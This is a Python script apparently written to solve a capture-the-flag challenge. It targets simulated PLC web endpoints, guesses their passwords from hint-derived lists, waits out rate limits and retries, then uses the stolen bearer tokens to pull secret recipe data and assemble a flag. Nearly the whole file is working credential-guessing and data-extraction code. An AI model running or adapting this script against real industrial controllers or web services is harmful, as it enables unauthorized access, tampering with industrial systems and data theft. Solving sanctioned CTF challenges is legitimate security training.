#!/usr/bin/env python3
"""
Final exploit with targeted passwords based on hint analysis
"""

import requests
import json
import time

BASE_URL = "https://qwertyuioplkjhg-csc26.cybersecuritychallenge.al"

# Targeted passwords based on hints
passwords_by_plc = {
    'PLC_001': ['admin123'], 
    'PLC_002': [
        'QC2026', 'quality2026', 'control2026', 'QC', 'quality', 'control',
        'Quality2026', 'Control2026', 'QualityControl2026'
    ],
    'PLC_003': [
        'Safety2026!', 'Safety2026@', 'Safety2026#', 'Safety2026$',
        'Security2026!', 'Security2026@', 'Security2026#'
    ],
    'PLC_004': [
        'Schedule2026', 'planning2026', 'operations2026',
        'Planning2026', 'Operations2026', 'Scheduling2026'
    ],
    'PLC_005': [
        'maint', 'maintenance', '123', 'service',
        'maint123', 'maintenance123', 'service123'
    ]
}

def try_auth(plc_id, pwd):
    """Try authentication"""
    try:
        response = requests.post(
            f"{BASE_URL}/plc/{plc_id}/auth",
            json={"password": pwd},
            timeout=10
        )
        
        if response.status_code == 429:
            print(f"  [!] Rate limited")
            time.sleep(8)
            return None
        
        if response.status_code == 200:
            data = response.json()
            if 'access_token' in data:
                return data['access_token']
        
        time.sleep(0.5)
    except Exception as e:
        print(f"  [-] Error: {e}")
        time.sleep(2)
    
    return None

def get_recipes(plc_id, token):
    """Get recipes"""
    headers = {'Authorization': f'Bearer {token}'}
    max_retries = 3
    
    for i in range(max_retries):
        try:
            response = requests.get(
                f"{BASE_URL}/plc/{plc_id}/recipes",
                headers=headers,
                timeout=10
            )
            
            if response.status_code == 429:
                wait_time = (i + 1) * 5
                print(f"  [!] Rate limited, waiting {wait_time}s...")
                time.sleep(wait_time)
                continue
            
            if response.status_code == 200:
                return response.json()
        except Exception as e:
            print(f"  [-] Error: {e}")
            time.sleep(2)
    
    return None

def main():
    print("="*70)
    print("FINAL TARGETED EXPLOIT - CSC26 Flag Collector")
    print("="*70)
    
    all_recipes = {}
    flag_parts = []
    
    for plc_id in ['PLC_001', 'PLC_002', 'PLC_003', 'PLC_004', 'PLC_005']:
        print(f"\n[*] {plc_id}")
        print("-" * 70)
        
        passwords = passwords_by_plc[plc_id]
        token = None
        successful_pwd = None
        
        for pwd in passwords:
            token = try_auth(plc_id, pwd)
            if token:
                successful_pwd = pwd
                print(f"  [+] SUCCESS with password: {pwd}")
                break
        
        if not token:
            print(f"  [-] Failed to authenticate")
            time.sleep(3)
            continue
        
        # Get recipes
        time.sleep(1)
        recipes = get_recipes(plc_id, token)
        
        if recipes:
            all_recipes[plc_id] = recipes
            print(f"  [+] Recipes retrieved")
            
            # Extract secret_data
            for recipe_id, recipe_data in recipes.get('recipes', {}).items():
                if 'secret_data' in recipe_data:
                    secret = recipe_data['secret_data']
                    print(f"      {recipe_id}: secret_data = '{secret}'")
                    flag_parts.append((plc_id, recipe_id, secret))
        
        time.sleep(3)  # Wait between PLCs
    
    # Display findings
    print(f"\n{'='*70}")
    print("FLAG PARTS COLLECTED")
    print("="*70)
    
    for plc_id, recipe_id, secret in flag_parts:
        print(f"{plc_id} / {recipe_id}: {secret}")
    
    # Try to assemble
    print(f"\n{'='*70}")
    print("FLAG ASSEMBLY ATTEMPT")
    print("="*70)
    
    if flag_parts:
        # Sort by PLC and recipe ID to ensure correct order
        flag_parts.sort()
        assembled = ''.join([part[2] for part in flag_parts])
        print(f"\n[!] Assembled Flag: {assembled}\n")
    
    # Save data
    with open('final_plc_data.json', 'w') as f:
        json.dump({
            'recipes': all_recipes,
            'flag_parts': [(p[0], p[1], p[2]) for p in flag_parts]
        }, f, indent=2)
    
    print(f"[+] Data saved to final_plc_data.json")

if __name__ == "__main__":
    main()
